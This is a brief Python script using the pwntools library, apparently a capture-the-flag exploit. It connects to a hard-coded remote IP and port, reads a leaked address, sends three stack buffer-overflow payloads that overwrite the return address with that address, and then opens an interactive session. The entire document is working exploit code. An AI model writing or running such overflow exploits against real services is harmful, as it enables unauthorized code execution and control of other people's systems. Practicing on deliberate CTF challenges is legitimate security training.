from pwn import *

p = remote('220.249.52.133','55023')

rc = lambda :p.recv()
context.log_level='debug'

def send_payload(buflen):
    p.recvuntil('is:')
    addr = p.recvuntil('\n')
    rc()
    payload = 'a'*(buflen+0x8)+p64(int(addr,16))
    p.sendline(payload)

send_payload(0x200)
send_payload(0x180)
send_payload(0x100)
p.interactive()
